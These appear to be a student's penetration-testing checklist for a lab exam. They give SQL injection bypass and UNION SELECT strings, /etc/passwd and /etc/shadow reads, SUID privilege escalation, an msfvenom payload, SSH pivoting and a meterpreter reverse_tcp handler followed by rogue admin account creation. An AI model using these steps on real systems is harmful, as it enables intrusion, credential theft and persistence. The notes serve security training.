MAKE OPNOTES THROUGH THE WHOLE THING

first step scan the given ip
do a banner grab on the open ports
   nc <ip> <port>
run http-enum.nse script against the http port
   make note of the command and the results
run a nikto scan against the same thing
   nikto -host <ip> if going through tunnel nikto -host 0.0.0.0 -port <built tunnel port>

SQL Injection WEB EXPLOITATION PORT 80 SHIT
      connect to website on firefox <ip>:<port>
      if you find an input field make note of the address
         in opnotes make note of anything that works or doesnt work(command injection,directory traversal)
         grab anything you can and move on
         if a question asks what a users shell is look at /etc/passwd
         CHECK /etc/hosts !!!!!!!!!!!!!!!
      make note of findings in those files
      if you find a command injection field or a webshell you can add your ssh key
      if you find a username and password field it will be SQL injection
         ' or 1='1 / ' or '1'='1 / try different variations
         if it works:
            reload the page with the dev console in the network tab click on the post and go to the cookies/header
            click the raw button on the get copy the line and then click in the search bar and enter something like:
            http://0.0.0.0:20001/login.php?username=%27+or+1%3D%271&passwd=%27+or+1%3D%271
      SQL injection review with Sgt Wilson :)
         if selection is a number try without quotes if not number it probably needs quotes
         SQL Steps to success
             1. selection=1 or 1=1#; iterate through all options using this to find the vulnerable one
             1.1. document what you found (the web address of the vulnerable one)
             2. identify which columns are which and identify how many (selection=7 union select 1,2,3)
                if it doesn't work right off the bat with the inital number of columns keep adding numbers until it works
             2.1. document the order of the columns and the amount
             3. TEST THE GOLDEN STATEMENT(selection=7 union select table_schema(1),table_name(2),column_name(3) from information_schema.columns)
             3.1. Document
             4. Look at the question and figure out what it wants you to find
                selection=7 union select username,user_id,name from siteusers.users
             5. If creds are farmed attempt to login
                If you come across passwords and they don't work try decoding with base64 or rot13
             5.1. If none of them work make note and move on          
            
DOCUMENT!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
If you come across passwords and they don't work try decoding with base64 or rot13

INITIAL ACCESS
    when getting onto the box
       whoami
       hostname
       ip a
       ifconfig -a
       VERIFY YOU ARE IN A BASH SHELL
    cat /etc/hosts (if not already done)
    sudo -l
 Priv Esc
    look for way to escalate
       find / -type f -perm /4000 -ls 2>/dev/null
          send results through gtfobins!!!!!!!!!!!!!!!!!!!!!!!!!!
             if you find something with gtfobins:
                use the "exploit" to escalate to root
                verify you are root with whoami
       if you can't escalate make note of it
 Checking for buffer overflow file
    looking for nonstandard files IT WILL BE WEIRD
    if gdb exists on the box you will be doing a buffer overflow
       when you find a buffer overflow keep it simple stupid
          msfvenom -p linux/x86/exec CMD="cat /etc/shadow" ... to cat the file you need
    Check for more hops
       conduct a ping sweep on the network(s) it's connected to
          based on ttl you can make a guess on the kind of box it is
       check ip neigh as a last resort
       arp -an is very unreliable
    if the ping sweep gives results create a dynamic tunnel to conduct nmap scans
    ssh <name>@tgtip -D 9050
    conduct nmap scans of the discovered ips
       make note of the scan that was conducted
    connect to the ips based on the available ports
       if the open ports include 80 see above steps
Windows Specific Notes (if 445/3389 is open)
       IF ANY OF THE PORTS SAY WELCOME TO SECURE SERVER 
         using msfconsole
            use multi/handler
            set payload windows/meterpreter/reverse_tcp
            set lhost 0.0.0.0
            set lport 1234
            run
            send payload
            verify it works by looking for "Welcome to secure server"
            create a user and add them to the admin group and the remote desktop groups
            re-rdp to it as the new user
      
   once you gain access
   look at the following:
      services.msc
         find the weird one and look at the properties
         make note of the path
